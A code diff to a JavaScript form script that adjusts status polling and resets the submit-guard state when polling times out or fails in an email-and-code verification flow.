@@ -851,8 +851,8 @@ function updateUIForStatus(status, data = {}) {
       }
       if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
-        startPolling(10000);
       }
+      startPolling(10000);
       break;
     case 'WAITINGCODE':
       emailGroup.style.display = 'none';
@@ -872,8 +872,8 @@ function updateUIForStatus(status, data = {}) {
       }
       if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
-        startPolling(10000);
       }
+      startPolling(10000);
       break;
     case 'COMPLETED':
       hideLoadingOverlay();
@@ -1123,12 +1123,12 @@ async function pollOperator() {
   if (pollingStartTime !== null && Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) {
     console.warn("Polling timed out after 10 minutes. Stopping polling.");
     clearInterval(pollingIntervalId);
-    if (!isSubmitting) {
-      showLoadingOverlay(false, true);
-      document.getElementById('GeneralError').textContent = "Session timed out. Please try again.";
-      document.getElementById('GeneralError').style.display = 'block';
-      resetFormState();
-    }
+    isSubmitting = false;
+    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+    showLoadingOverlay(false, true);
+    document.getElementById('GeneralError').textContent = "Session timed out. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    resetFormState();
     return;
   }
 
@@ -1158,12 +1158,12 @@ async function pollOperator() {
   } catch (error) {
     console.error("Error during polling:", error);
     clearInterval(pollingIntervalId);
-    if (!isSubmitting) {
-      document.getElementById('GeneralError').textContent = "Polling failed. Please try again.";
-      document.getElementById('GeneralError').style.display = 'block';
-      hideLoadingOverlay();
-      resetFormState();
-    }
+    isSubmitting = false;
+    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+    document.getElementById('GeneralError').textContent = "Polling failed. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    hideLoadingOverlay();
+    resetFormState();
   }
 }
 
